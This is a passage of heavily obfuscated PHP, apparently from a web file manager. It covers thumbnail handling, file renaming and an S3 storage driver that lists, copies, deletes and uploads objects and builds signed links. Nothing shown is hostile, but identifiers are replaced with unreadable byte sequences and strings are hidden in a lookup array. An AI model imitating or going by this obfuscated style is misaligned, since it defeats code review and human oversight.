(isset($GLOBALS[$ƒÄã°ë[168]]) && $GLOBALS[$ƒÄã°ë[168]][$ƒÄã°ë[84]] == $£Šºí[$ƒÄã°ë[84]]) { $˜ûÓàç = $GLOBALS[$ƒÄã°ë[168]][$ƒÄã°ë[169]]; if (!$£Šºí[$ƒÄã°ë[170]]) { $£Šºí[$ƒÄã°ë[170]] = $GLOBALS[$ƒÄã°ë[168]]; } if (isset($˜ûÓàç[$ƒÄã°ë[171]])) { if ($˜ûÓàç[$ƒÄã°ë[171]] <= $Ÿ²¸ÚÃô && $˜ûÓàç[$ƒÄã°ë[172]] <= $Ÿ²¸ÚÃô) { $°¡Ğå»… = !0; } } $Õ–÷á Œ = $£Šºí[$ƒÄã°ë[170]][$ƒÄã°ë[32]]; } if ($£Šºí[$ƒÄã°ë[76]] <= 1024 * 50 || $°¡Ğå»… || !function_exists($ƒÄã°ë[173]) || $£Šºí[$ƒÄã°ë[174]] == $ƒÄã°ë[175]) { return $this->fileOut($¥‘Ãİê¯, !1, $Õ–÷á Œ); } if (isset($£Šºí[$ƒÄã°ë[170]][$ƒÄã°ë[176]])) { $Àô¨²Ù = $£Šºí[$ƒÄã°ë[170]][$ƒÄã°ë[176]]; } else { if (isset($£Šºí[$ƒÄã°ë[170]][$ƒÄã°ë[177]])) { $Àô¨²Ù = $£Šºí[$ƒÄã°ë[170]][$ƒÄã°ë[177]]; } } if (!$Àô¨²Ù) { $Àô¨²Ù = md5("{$£Šºí[$ƒÄã°ë[32]]}\x5f{$£Šºí[$ƒÄã°ë[84]]}\x5f{$£Šºí[$ƒÄã°ë[76]]}\x5f{$Ÿ²¸ÚÃô}"); } $‰Ü£ã¨¦ = "{$Àô¨²Ù}\x5f{$Ÿ²¸ÚÃô}\x2e\160\x6e\147"; if (!($ÖÉğÆ„ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $ƒÄã°ë[178]))) { $á¡½í¾ß = IO::mkdir(IO_PATH_SYSTEM_TEMP . $ƒÄã°ë[179]); } else { $á¡½í¾ß = KodIO::make($ÖÉğÆ„); } if ($ÖÉğÆ„ = IO::fileNameExist($á¡½í¾ß, $‰Ü£ã¨¦)) { $’ïŞö¸ = KodIO::make($ÖÉğÆ„); return IO::fileOut($’ïŞö¸, !1, $Õ–÷á Œ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $’ïŞö¸ = DATA_THUMB . $‰Ü£ã¨¦; del_file($’ïŞö¸); if (!@file_exists($’ïŞö¸)) { $ˆ¾ƒ™šõ = TEMP_FILES; if (!is_dir($ˆ¾ƒ™šõ)) { mk_dir($ˆ¾ƒ™šõ); } $à‡èìÚÓ = $ˆ¾ƒ™šõ . $Àô¨²Ù . $ƒÄã°ë[10] . $£Šºí[$ƒÄã°ë[174]]; if (!@file_exists($à‡èìÚÓ)) { $à‡èìÚÓ = $this->download($¥‘Ãİê¯, $à‡èìÚÓ); } ImageThumb::createThumb($à‡èìÚÓ, $’ïŞö¸, $Ÿ²¸ÚÃô, $Ÿ²¸ÚÃô * 10); } if (!file_exists($’ïŞö¸) || filesize($’ïŞö¸) < 100) { return @file_exists($à‡èìÚÓ) ? IO::fileOut($à‡èìÚÓ) : $this->fileOut($¥‘Ãİê¯); } if (!($’Ì´€¹· = IO::move($’ïŞö¸, $á¡½í¾ß))) { return IO::fileOut($’ïŞö¸); } del_file($’ïŞö¸); IO::fileOut($’Ì´€¹·); } public function fileOutImageServer($ûĞØ†¾İ, $©ÑÙôŒ¨ = 250) { $this->fileOutImage($ûĞØ†¾İ, $©ÑÙôŒ¨); } public function fileNameAuto($¹ĞÂ¨Ÿ, $õ×é‘¢­, $®’½ ·› = REPEAT_RENAME, $ƒş³ı•† = false) { $ÔÚ¤·è =& $_SERVER[ Ö‘ñÄ”]; $‡ÔëÜ²É = $¹ĞÂ¨Ÿ === $ÔÚ¤·è[12] ? $õ×é‘¢­ : rtrim($¹ĞÂ¨Ÿ, $ÔÚ¤·è[8]) . $ÔÚ¤·è[8] . $õ×é‘¢­; if ($®’½ ·› == REPEAT_REPLACE || !$this->exist($‡ÔëÜ²É) || $ƒş³ı•† && $®’½ ·› != REPEAT_RENAME_FOLDER) { return $õ×é‘¢­; } if ($®’½ ·› == REPEAT_SKIP) { return !1; } $©ı©õöŒ = $ÔÚ¤·è[10] . get_path_ext($õ×é‘¢­); $©ı©õöŒ = $©ı©õöŒ == $ÔÚ¤·è[10] || $ƒş³ı•† ? $ÔÚ¤·è[12] : $©ı©õöŒ; $ù‚£—æÎ = 1; $¹ÊòéÚœ = substr($õ×é‘¢­, 0, strlen($õ×é‘¢­) - strlen($©ı©õöŒ)); $ÓŸ°÷ª÷ = $¹ÊòéÚœ . "\50{$ù‚£—æÎ}\x29{$©ı©õöŒ}"; while ($this->exist(rtrim($¹ĞÂ¨Ÿ, $ÔÚ¤·è[8]) . $ÔÚ¤·è[8] . $ÓŸ°÷ª÷)) { $ÓŸ°÷ª÷ = $¹ÊòéÚœ . "\x28{$ù‚£—æÎ}\51{$©ı©õöŒ}"; $ù‚£—æÎ++; } return $ÓŸ°÷ª÷; } private function fileNameAutoList($Ÿñ«”Ñà, $¤Â˜±¦, $«‡¢¦÷ = false) { $öó—Ş„È =& $_SERVER[ Ö‘ñÄ”]; $³ìƒ†øª = $this->listPath($Ÿñ«”Ñà, !0); $³ìƒ†øª = array_merge($³ìƒ†øª[$öó—Ş„È[82]], $³ìƒ†øª[$öó—Ş„È[83]]); $…£ÚËØ’ = array_to_keyvalue($³ìƒ†øª, $öó—Ş„È[12], $öó—Ş„È[32]); $­Í§Å¾¦ = $öó—Ş„È[10] . get_path_ext($¤Â˜±¦); $­Í§Å¾¦ = $­Í§Å¾¦ == $öó—Ş„È[10] || $«‡¢¦÷ ? $öó—Ş„È[12] : $­Í§Å¾¦; $Óè¥üî§ = substr($¤Â˜±¦, 0, strlen($¤Â˜±¦) - strlen($­Í§Å¾¦)); $§ñŸÉ = $Óè¥üî§ . "\50\x30\51{$­Í§Å¾¦}"; for ($ì¯åÜğ¦ = 1; $ì¯åÜğ¦ <= count($…£ÚËØ’) + 1; $ì¯åÜğ¦++) { $§ñŸÉ = $Óè¥üî§ . "\x28{$ì¯åÜğ¦}\51{$­Í§Å¾¦}"; if (!in_array_not_case($§ñŸÉ, $…£ÚËØ’)) { return $§ñŸÉ; } } return $§ñŸÉ; } public function listAllFiles($†î”úï¸, $Û·È˜ª, $Èüë„¶ó = array()) { $šêã›‹Ó =& $_SERVER[ Ö‘ñÄ”]; if (empty($Û·È˜ª)) { return array(); } $ŠÁ›©£Ö = array(); $†î”úï¸ = trim($†î”úï¸, $šêã›‹Ó[8]); foreach ($Û·È˜ª as $æòùã˜µ) { $…¯ãã±š = ltrim(substr(trim($æòùã˜µ, $šêã›‹Ó[8]), strlen($†î”úï¸)), $šêã›‹Ó[8]); $ŠÁ›©£Ö = array_merge($ŠÁ›©£Ö, $this->slicePath($…¯ãã±š)); } $ş¡ÀÆÉ‘ = array(); foreach (array_unique($ŠÁ›©£Ö) as $æòùã˜µ) { $¯ƒ”ïïá = array($šêã›‹Ó[84] => $this->getPathOuter($šêã›‹Ó[8] . $†î”úï¸ . $šêã›‹Ó[8] . $æòùã˜µ), $šêã›‹Ó[75] => 1, $šêã›‹Ó[76] => 0); if (substr($æòùã˜µ, -1) != $šêã›‹Ó[8]) { $¯ƒ”ïïá[$šêã›‹Ó[75]] = 0; $ÔÌ¡‡ªœ = $this->getPath($†î”úï¸ . $šêã›‹Ó[8] . $æòùã˜µ); $¯ƒ”ïïá[$šêã›‹Ó[76]] = isset($Èüë„¶ó[$ÔÌ¡‡ªœ]) ? $Èüë„¶ó[$ÔÌ¡‡ªœ] : $this->size($ÔÌ¡‡ªœ); } $ş¡ÀÆÉ‘[] = $¯ƒ”ïïá; } return $ş¡ÀÆÉ‘; } public function slicePath($«Û¶±½…) { $‡ÍœÙ =& $_SERVER[ Ö‘ñÄ”]; $•ÅŠôÎö = explode($‡ÍœÙ[8], trim($«Û¶±½…, $‡ÍœÙ[8])); $¯ù÷±¤” = 0; do { ++$¯ù÷±¤”; $Ğ¦ÂË×ê[] = implode($‡ÍœÙ[8], array_slice($•ÅŠôÎö, 0, $¯ù÷±¤”)) . $‡ÍœÙ[8]; } while ($¯ù÷±¤” < count($•ÅŠôÎö)); $Ğ¦ÂË×ê[count($•ÅŠôÎö) - 1] = $«Û¶±½…; return $Ğ¦ÂË×ê; } public function getHost() { $Áùº»° =& $_SERVER[ Ö‘ñÄ”]; $Çº– ¤© = parse_url(trim($this->domain, $Áùº»°[8])); $¤Ø‡Ú€Ğ = isset($Çº– ¤©[$Áùº»°[180]]) ? $Çº– ¤©[$Áùº»°[180]] : http_type(); $¸ÀÙ­˜Ó = isset($Çº– ¤©[$Áùº»°[181]]) ? $Çº– ¤©[$Áùº»°[181]] : $Çº– ¤©[$Áùº»°[84]]; if (isset($Çº– ¤©[$Áùº»°[182]])) { $¸ÀÙ­˜Ó .= $Áùº»°[4] . $Çº– ¤©[$Áùº»°[182]]; } return $¤Ø‡Ú€Ğ . $Áùº»°[183] . $¸ÀÙ­˜Ó; } public function pathEncode($öÃ†Ã¶º) { $ìİ„£¬ =& $_SERVER[ Ö‘ñÄ”]; return str_replace($ìİ„£¬[184], $ìİ„£¬[8], rawurlencode($öÃ†Ã¶º)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($ËšäÛşÌ) { set_timeout(); require_once SDK_DIR . $_SERVER[ Ö‘ñÄ”][185]; parent::__construct(); $this->_init($ËšäÛşÌ); } public function _init($£ÜıóÔä) { foreach ($£ÜıóÔä as $é•óÁÊÏ => $ı»˜ºˆ) { if (isset($this->{$é•óÁÊÏ})) { $this->{$é•óÁÊÏ} = $ı»˜ºˆ; } } $this->endpoint = $£ÜıóÔä[$_SERVER[ Ö‘ñÄ”][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ÃàŠèˆ— = "\166\x34") { $this->signVer = $ÃàŠèˆ—; $this->client->setSignatureVersion($ÃàŠèˆ—); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ë—‹©Îã =& $_SERVER[ Ö‘ñÄ”]; $Ñ½ÄşìÎ = $this->getBucketCors(); if (!$Ñ½ÄşìÎ || !is_array($Ñ½ÄşìÎ)) { return !1; } if ($Ñ½ÄşìÎ[$ë—‹©Îã[187]] != $ë—‹©Îã[188] || $Ñ½ÄşìÎ[$ë—‹©Îã[189]] != $ë—‹©Îã[188]) { return !1; } $ŸŸÚüÆ = array_map($ë—‹©Îã[190], $Ñ½ÄşìÎ[$ë—‹©Îã[191]]); if (!is_array($ŸŸÚüÆ)) { $ŸŸÚüÆ = array(); } $õ‡ş€ŠÛ = array($ë—‹©Îã[192], $ë—‹©Îã[193], $ë—‹©Îã[194], $ë—‹©Îã[195], $ë—‹©Îã[196]); $ÀıÓ Â¨ = array_diff($õ‡ş€ŠÛ, $ŸŸÚüÆ); return empty($ÀıÓ Â¨); } public function mkfile($€¡üåÅË, $¤„ÍŸ‰² = '', $şÈ²ùå¼ = REPEAT_RENAME) { $ğÓÓôõ¨ = $this->setContent($€¡üåÅË, $¤„ÍŸ‰²); if ($ğÓÓôõ¨ !== !1) { return $this->getPathOuter($€¡üåÅË); } return !1; } public function mkdir($ï‹ò¢è§, $ –¤¡×ã = REPEAT_SKIP) { $¼¤ĞÎâ¤ =& $_SERVER[ Ö‘ñÄ”]; if (empty($ï‹ò¢è§) && $ï‹ò¢è§ !== $¼¤ĞÎâ¤[197]) { return !1; } if ($ –¤¡×ã && $this->_isFolder($ï‹ò¢è§)) { return $this->getPathOuter($ï‹ò¢è§); } $ö»¯œ–ü = $this->setContent($ï‹ò¢è§, $¼¤ĞÎâ¤[12], !0); if ($ö»¯œ–ü !== !1) { return $this->getPathOuter($ï‹ò¢è§); } return !1; } public function copyFile($¢õ•¼Â¯, $ÊÊ™‡ù¼, $—·‡Ú‡ = array()) { $”ÂŞßµ€ =& $_SERVER[ Ö‘ñÄ”]; $îˆ½Ê– = $this->objectMeta($¢õ•¼Â¯); if (!$îˆ½Ê–) { return !1; } if ($îˆ½Ê–[$”ÂŞßµ€[76]] <= 1024 * 1024 * 200) { $ú‹÷Ä¤ = $this->client->copyObject($this->bucket, $¢õ•¼Â¯, $this->bucket, $ÊÊ™‡ù¼, $”ÂŞßµ€[198], $—·‡Ú‡); } else { $ú‹÷Ä¤ = $this->client->multiCopyObject($this->bucket, $¢õ•¼Â¯, $this->bucket, $ÊÊ™‡ù¼, $—·‡Ú‡); } $ú‹÷Ä¤ = $ú‹÷Ä¤ ? $this->getPathOuter($ÊÊ™‡ù¼) : !1; return $ú‹÷Ä¤; } public function moveFile($œøõòÌ, $Ûú«¼íÉ) { if ($this->copyFile($œøõòÌ, $Ûú«¼íÉ)) { $this->delFile($œøõòÌ); return $this->getPathOuter($Ûú«¼íÉ); } return !1; } public function delFile($™ô¯ïöË) { return $this->client->deleteObject($this->bucket, $™ô¯ïöË); } public function delFolder($Ä†½úïµ) { $Æ½‘«…¤ =& $_SERVER[ Ö‘ñÄ”]; if (!$this->exist($Ä†½úïµ)) { return !0; } $this->listItemCache = !1; $é«Í†Ğæ = $this->fileList($Ä†½úïµ); $this->listItemCache = !0; $ô‘®˜‚Ñ = trim($Ä†½úïµ, $Æ½‘«…¤[8]) . $Æ½‘«…¤[8]; if (!empty($Ä†½úïµ) && $Ä†½úïµ !== $Æ½‘«…¤[197] && !in_array($ô‘®˜‚Ñ, $é«Í†Ğæ[$Æ½‘«…¤[82]])) { $é«Í†Ğæ[$Æ½‘«…¤[82]][] = $ô‘®˜‚Ñ; } $ßÑÕ§—ß = $this->delByBatch($é«Í†Ğæ[$Æ½‘«…¤[83]]); if (!$ßÑÕ§—ß) { return !1; } $ßÑÕ§—ß = $this->delByBatch($é«Í†Ğæ[$Æ½‘«…¤[82]]); if (!$ßÑÕ§—ß) { return !1; } return $this->delFile($ô‘®˜‚Ñ); } private function delByBatch($›Ùßïô§) { foreach (array_chunk($›Ùßïô§, 1000) as $×“›×¬Í) { $ÏàŸüãª = $this->client->deleteObjects($this->bucket, $×“›×¬Í); if (!$ÏàŸüãª) { return !1; } } return !0; } public function rename($úÕá¦·Ÿ, $ĞŠŒÁ¿é) { return $this->renameObject($úÕá¦·Ÿ, $ĞŠŒÁ¿é); } public function listPath($ÖÑìŞê, $±¢Îø„Ó = false) { $šÀ‰ÊÕı =& $_SERVER[ Ö‘ñÄ”]; $ŒŞù¨…¦ = $this->fileList($ÖÑìŞê, $šÀ‰ÊÕı[8], !0); foreach ($ŒŞù¨…¦[$šÀ‰ÊÕı[82]] as $È›•Ñ¨Â => $Üñ¥Ô…Ï) { $ŒŞù¨…¦[$šÀ‰ÊÕı[82]][$È›•Ñ¨Â] = $this->folderInfo($Üñ¥Ô…Ï, $±¢Îø„Ó, $Üñ¥Ô…Ï); } foreach ($ŒŞù¨…¦[$šÀ‰ÊÕı[83]] as $È›•Ñ¨Â => $Üñ¥Ô…Ï) { $ŒŞù¨…¦[$šÀ‰ÊÕı[83]][$È›•Ñ¨Â] = $this->fileInfo($Üñ¥Ô…Ï[$šÀ‰ÊÕı[32]], $±¢Îø„Ó, $Üñ¥Ô…Ï); } return $ŒŞù¨…¦; } protected function infoChildren($µ‚÷ÎÁ, &$Ïš’Ú) { $óÚµò‘î =& $_SERVER[ Ö‘ñÄ”]; $Š€ÎÄ–õ = $this->fileList($µ‚÷ÎÁ, $óÚµò‘î[12], !0); $Ïš’Ú[$óÚµò‘î[78]] += count($Š€ÎÄ–õ[$óÚµò‘î[82]]); $Ïš’Ú[$óÚµò‘î[77]] += count($Š€ÎÄ–õ[$óÚµò‘î[83]]); foreach ($Š€ÎÄ–õ[$óÚµò‘î[83]] as $ÎÃÚŠé) { if (!$ÎÃÚŠé || !$ÎÃÚŠé[$óÚµò‘î[76]]) { continue; } $Ïš’Ú[$óÚµò‘î[76]] += $ÎÃÚŠé[$óÚµò‘î[76]]; } } private function fileInfo($˜Å×±, $«Æ¢ØáÃ = false, $õºéŸ¡“ = array()) { $Ìƒ”ÇóŒ =& $_SERVER[ Ö‘ñÄ”]; $Õç“Å = array($Ìƒ”ÇóŒ[32] => $this->pathThis($˜Å×±), $Ìƒ”ÇóŒ[84] => $this->getPathOuter($˜Å×±), $Ìƒ”ÇóŒ[33] => $Ìƒ”ÇóŒ[199], $Ìƒ”ÇóŒ[174] => $this->ext($˜Å×±), $Ìƒ”ÇóŒ[76] => isset($õºéŸ¡“[$Ìƒ”ÇóŒ[76]]) ? $õºéŸ¡“[$Ìƒ”ÇóŒ[76]] : 0); if ($«Æ¢ØáÃ) { return $Õç“Å; } $Õç“Å[$Ìƒ”ÇóŒ[200]] = $Õç“Å[$Ìƒ”ÇóŒ[85]] = 0; $Õç“Å[$Ìƒ”ÇóŒ[201]] = $Õç“Å[$Ìƒ”ÇóŒ[202]] = !0; if (empty($õºéŸ¡“)) { $õºéŸ¡“ = $this->objectMeta($˜Å×±); if (!$õºéŸ¡“) { return $Õç“Å; } } if (isset($õºéŸ¡“[$Ìƒ”ÇóŒ[203]])) { $Õç“Å[$Ìƒ”ÇóŒ[85]] = $õºéŸ¡“[$Ìƒ”ÇóŒ[203]]; } if (isset($õºéŸ¡“[$Ìƒ”ÇóŒ[76]])) { $Õç“Å[$Ìƒ”ÇóŒ[76]] = $õºéŸ¡“[$Ìƒ”ÇóŒ[76]]; } return $Õç“Å; } private function folderInfo($í¹Ôş’, $‰¾«¦ı€ = false, $ùæŞÎÊÛ = array()) { $Ò¯È‰¼á =& $_SERVER[ Ö‘ñÄ”]; $…’äšÖ‚ = array($Ò¯È‰¼á[32] => $this->pathThis($í¹Ôş’), $Ò¯È‰¼á[84] => $this->getPathOuter($Ò¯È‰¼á[8] . $í¹Ôş’), $Ò¯È‰¼á[33] => $Ò¯È‰¼á[75]); if ($‰¾«¦ı€) { return $…’äšÖ‚; } $…’äšÖ‚[$Ò¯È‰¼á[200]] = $…’äšÖ‚[$Ò¯È‰¼á[85]] = 0; $…’äšÖ‚[$Ò¯È‰¼á[201]] = $…’äšÖ‚[$Ò¯È‰¼á[202]] = !0; if ($í¹Ôş’ == $Ò¯È‰¼á[12]) { return $…’äšÖ‚; } if (empty($ùæŞÎÊÛ)) { $ùæŞÎÊÛ = $this->objectMeta(trim($í¹Ôş’, $Ò¯È‰¼á[8]) . $Ò¯È‰¼á[8]); } if (isset($ùæŞÎÊÛ[$Ò¯È‰¼á[203]])) { $…’äšÖ‚[$Ò¯È‰¼á[200]] = $ùæŞÎÊÛ[$Ò¯È‰¼á[203]]; } return $…’äšÖ‚; } private function fileList($íµœ•º, $ƒûÖì°¼ = '', $Û¾áÀ¯ = 0) { $±Ø¶ñèÅ =& $_SERVER[ Ö‘ñÄ”]; $Šëşáˆ¯ = rtrim($íµœ•º, $±Ø¶ñèÅ[8]) . $±Ø¶ñèÅ[8]; $Üç×ê€å = $this->listObjs($Šëşáˆ¯, null, null, $ƒûÖì°¼); if (!$Üç×ê€å) { return array($±Ø¶ñèÅ[82] => array(), $±Ø¶ñèÅ[83] => array()); } $æäæÄáÍ = $öÕ¸‹©Í = array(); foreach ($Üç×ê€å[$±Ø¶ñèÅ[204]] as $äü‚Å³Ö) { $ıÇ¿·ı‡ = $äü‚Å³Ö[$±Ø¶ñèÅ[32]]; if ($ıÇ¿·ı‡ == $Šëşáˆ¯) { continue; } $òÂ©ÃÊ = isset($äü‚Å³Ö[$±Ø¶ñèÅ[76]]) ? $äü‚Å³Ö[$±Ø¶ñèÅ[76]] : 0; $ÜÙ‚æ« = $òÂ©ÃÊ == 0 && substr($ıÇ¿·ı‡, strlen($ıÇ¿·ı‡) - 1, 1) == $±Ø¶ñèÅ[8] ? !0 : !1; $this->cacheMethodInfoSet($ıÇ¿·ı‡, $ÜÙ‚æ«, $äü‚Å³Ö); if ($ÜÙ‚æ«) { $æäæÄáÍ[] = $ıÇ¿·ı‡; continue; } $öÕ¸‹©Í[] = $Û¾áÀ¯ ? $äü‚Å³Ö : $ıÇ¿·ı‡; } foreach ($Üç×ê€å[$±Ø¶ñèÅ[205]] as $äü‚Å³Ö) { $æäæÄáÍ[] = $äü‚Å³Ö[$±Ø¶ñèÅ[32]]; $this->cacheMethodInfoSet($äü‚Å³Ö[$±Ø¶ñèÅ[32]], !0); } $this->cacheMethodInfoSet($íµœ•º, !0); return array($±Ø¶ñèÅ[82] => $æäæÄáÍ, $±Ø¶ñèÅ[83] => $öÕ¸‹©Í); } private function listObjs($‚ °Ö×ó, $ƒ¦†­‘È = null, $ÅÓ˜şîÆ = null, $ŠÑ•ª’ = null) { $Š×†Ö€ =& $_SERVER[ Ö‘ñÄ”]; $‚ °Ö×ó = trim($‚ °Ö×ó, $Š×†Ö€[8]); $åÀüØ”ˆ = empty($‚ °Ö×ó) && $‚ °Ö×ó !== $Š×†Ö€[197] ? $Š×†Ö€[12] : $‚ °Ö×ó . $Š×†Ö€[8]; return $this->client->getBucket($this->bucket, $åÀüØ”ˆ, $ƒ¦†­‘È, $ÅÓ˜şîÆ, $ŠÑ•ª’, !0); } public function has($óò³Ö–ó, $’ˆ±Œóí = false, $©Ğš°¡© = true) { $š£€ê– =& $_SERVER[ Ö‘ñÄ”]; $óò³Ö–ó = trim($óò³Ö–ó, $š£€ê–[8]); $×ËØŞ¦ = empty($óò³Ö–ó) && $óò³Ö–ó !== $š£€ê–[197] ? $š£€ê–[12] : $óò³Ö–ó . $š£€ê–[8]; $¡¸¯Èï® = null; $Û¾…¾ = 500; $Ìè“î = $š£€ê–[8]; $ùùÏÎº = $‚Şà¡‹ = array(); while (!0) { $·óæ¡€ = $this->listObjs($óò³Ö–ó, $¡¸¯Èï®, $Û¾…¾, $Ìè“î); if (!$·óæ¡€) { break; } $¡¸¯Èï® = $·óæ¡€[$š£€ê–[206]]; $ÏÆ—æ½¬ = $·óæ¡€[$š£€ê–[204]]; $ÑĞ¶Âúö = $·óæ¡€[$š£€ê–[205]]; if (empty($ÏÆ—æ½¬) && empty($ÑĞ¶Âúö)) { break; } if (count($ÏÆ—æ½¬) == 1 && $ÏÆ—æ½¬[0][$š£€ê–[32]] == $×ËØŞ¦) { break; } if ($’ˆ±Œóí) { if (count($ÏÆ—æ½¬)) { $ÏÆ—æ½¬ = array_column($ÏÆ—æ½¬, $š£€ê–[32]); $ùùÏÎº = array_merge($ùùÏÎº, $ÏÆ—æ½¬); } if (count($ÑĞ¶Âúö)) { $ÑĞ¶Âúö = array_column($ÑĞ¶Âúö, $š£€ê–[32]); $‚Şà¡‹ = array_merge($‚Şà¡‹, $ÑĞ¶Âúö); } if ($¡¸¯Èï® === null) { break; } continue; } if ($©Ğš°¡©) { if (!empty($ÏÆ—æ½¬)) { if (count($ÏÆ—æ½¬) > 1 || isset($ÏÆ—æ½¬[0][$š£€ê–[32]]) && $ÏÆ—æ½¬[0][$š£€ê–[32]] != $×ËØŞ¦) { return !0; } } } else { if (!empty($ÑĞ¶Âúö)) { return !0; } } if ($¡¸¯Èï® === null) { break; } } if ($’ˆ±Œóí) { $ùùÏÎº = array_diff($ùùÏÎº, array($×ËØŞ¦)); $ùùÏÎº = count(array_unique($ùùÏÎº)); $‚Şà¡‹ = count(array_unique($‚Şà¡‹)); return array($š£€ê–[207] => $ùùÏÎº, $š£€ê–[208] => $‚Şà¡‹); } return !1; } public function listAll($‹¯Ø¾Çö) { $Òİ¤¸ =& $_SERVER[ Ö‘ñÄ”]; $²¶´ä« = $this->fileList($‹¯Ø¾Çö, $Òİ¤¸[12], !0); $±  Ÿ“± = array(); foreach ($²¶´ä«[$Òİ¤¸[83]] as $ÈÄè¤) { $±  Ÿ“±[$ÈÄè¤[$Òİ¤¸[32]]] = $ÈÄè¤[$Òİ¤¸[76]]; } foreach ($²¶´ä«[$Òİ¤¸[82]] as $ÈÄè¤) { if (is_string($ÈÄè¤)) { $±  Ÿ“±[$ÈÄè¤] = 0; } } return $this->listAllFiles($‹¯Ø¾Çö, array_keys($±  Ÿ“±), $±  Ÿ“±); } public function canRead($­ìğÆÙ) { $Ä¨Õñ¿Ñ =& $_SERVER[ Ö‘ñÄ”]; $ÔÂ©âõ‹ = $this->client->getAccessControlPolicy($this->bucket, $­ìğÆÙ); if (!$ÔÂ©âõ‹) { return !1; } return in_array($ÔÂ©âõ‹, array($Ä¨Õñ¿Ñ[209], $Ä¨Õñ¿Ñ[210], $Ä¨Õñ¿Ñ[211])) ? !0 : !1; } public function canWrite($øìÉ”§è) { $ğğ¯®£ =& $_SERVER[ Ö‘ñÄ”]; $……Åæ‚› = $this->client->getAccessControlPolicy($this->bucket, $øìÉ”§è); if (!$……Åæ‚›) { return !1; } return in_array($……Åæ‚›, array($ğğ¯®£[209], $ğğ¯®£[210])) ? !0 : !1; } public function getContent($Ó Ì¶¦Ó) { return $this->client->getObject($this->bucket, $Ó Ì¶¦Ó); } public function setContent($Œş„ıÁ, $ØìßêêÇ = '', $É€”Ûö— = false) { $ÃÃ•ì¸£ =& $_SERVER[ Ö‘ñÄ”]; $Œş„ıÁ = $É€”Ûö— ? trim($Œş„ıÁ, $ÃÃ•ì¸£[8]) . $ÃÃ•ì¸£[8] : $Œş„ıÁ; $¡öşÏ¦Ô = get_file_mime(get_path_ext($Œş„ıÁ)); $ßôÕˆà» = $this->client->putObject($ØìßêêÇ, $this->bucket, $Œş„ıÁ, $ÃÃ•ì¸£[198], array(), $¡öşÏ¦Ô); if (!$ßôÕˆà») { return !1; } if ($É€”Ûö—) { return !0; } $this->cacheMethod(null, null); $ßôÕˆà» = $this->copyFile($Œş„ıÁ, $Œş„ıÁ, array($ÃÃ•ì¸£[212] => $ßôÕˆà»[$ÃÃ•ì¸£[213]])); return $ßôÕˆà» ? !0 : !1; } public function fileSubstr($À¶²–²¾, $âç¡”“ù, $ş£‚İüï) { $ÅğêøÎÆ = $âç¡”“ù + $ş£‚İüï - 1; return $this->client->getObject($this->bucket, $À¶²–²¾, array($_SERVER[ Ö‘ñÄ”][214] => "\x62\x79\x74\x65\x73\75{$âç¡”“ù}\x2d{$ÅğêøÎÆ}")); } public function upload($ƒ”Ø¼Ò–, $ú¥ÃÇÖÛ, $§—•ÍŸÊ = false, $ÉµœÈô = REPEAT_REPLACE) { $Àş‹½æ =& $_SERVER[ Ö‘ñÄ”]; $èÙˆçñæ = array($Àş‹½æ[212] => @md5_file($ú¥ÃÇÖÛ)); $ÓÕ€¦¹ = array($Àş‹½æ[215] => get_file_mime(get_path_ext($ƒ”Ø¼Ò–))); if (IO::size($ú¥ÃÇÖÛ) <= 1024 * 1024 * 200) { $İÏÀ”Ô¿ = $this->client->putObjectFile($ú¥ÃÇÖÛ, $this->bucket, $ƒ”Ø¼Ò–, $Àş‹½æ[198], $èÙˆçñæ, $ÓÕ€¦¹); return !empty($İÏÀ”Ô¿) ? $this->getPathOuter($ƒ”Ø¼Ò–) : !1; } $ÎûÂŞ°è = $this->client->multiUploadObject($ú¥ÃÇÖÛ, $this->bucket, trim($ƒ”Ø¼Ò–, $Àş‹½æ[8]), $èÙˆçñæ, $ÓÕ€¦¹); return $ÎûÂŞ°è ? $this->getPathOuter($ƒ”Ø¼Ò–) : !1; } public function download($¤ÚÎ©ï‰, $ª‘…ˆ™Á) { if (!@is_dir($this->pathFather($ª‘…ˆ™Á)) && !IO::mkdir($this->pathFather($ª‘…ˆ™Á))) { return !1; } $äİœ»»ç = $this->client->getObject($this->bucket, $¤ÚÎ©ï‰, array(), $ª‘…ˆ™Á); return $äİœ»»ç !== !1 ? $ª‘…ˆ™Á : !1; } public function link($ã°íÑÛ¦, $¹¯¯À¸ = array()) { $úÊÇøì‡ =& $_SERVER[ Ö‘ñÄ”]; if ($this->signVer == $úÊÇøì‡[216]) { return $this->client->getAuthenticatedURL($this->bucket, $ã°íÑÛ¦, 3600 * 12, $¹¯¯À¸); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ã°íÑÛ¦, $úÊÇøì‡[8]), 3600 * 12, $this->region, array(), !0, $¹¯¯À¸); } public function fileOut($áûøôäƒ, $š‹ÚŒ“÷ = false, $ñ¶¥Ö = false, $ÊŠÍÚ¬ï = '') { $¦‘ñØÜÅ =& $_SERVER[ Ö‘ñÄ”]; if ($this->isFileOutServer()) { return $this->fileOutServer($áûøôäƒ, $š‹ÚŒ“÷, $ñ¶¥Ö, $ÊŠÍÚ¬ï); } if (!$ñ¶¥Ö) { $ñ¶¥Ö = $this->pathThis($áûøôäƒ); } $úë™èÕÑ = get_file_mime(get_path_ext($ñ¶¥Ö)); if ($úë™èÕÑ == $¦‘ñØÜÅ[217]) { return parent::fileOut($áûøôäƒ, $š‹ÚŒ“÷, $ñ¶¥Ö, $ÊŠÍÚ¬ï); } $¬Ö‘›¤® = array($¦‘ñØÜÅ[218] => $úë™èÕÑ); if ($š‹ÚŒ“÷) { $¬Ö‘›¤®[$¦‘ñØÜÅ[219]] = $¦‘ñØÜÅ[220] . rawurlencode($ñ¶¥Ö); } else { } $¬¢÷ğ©¬ = $this->link($áûøôäƒ, $¬Ö‘›¤®); $this->fileOutLink($¬¢÷ğ©¬); } public function fileOutServer($Ï–ğ¡ãş, $½İ¯ëşĞ = false, $˜“ğ§°Ø = false, $úò»«¡ = '') { 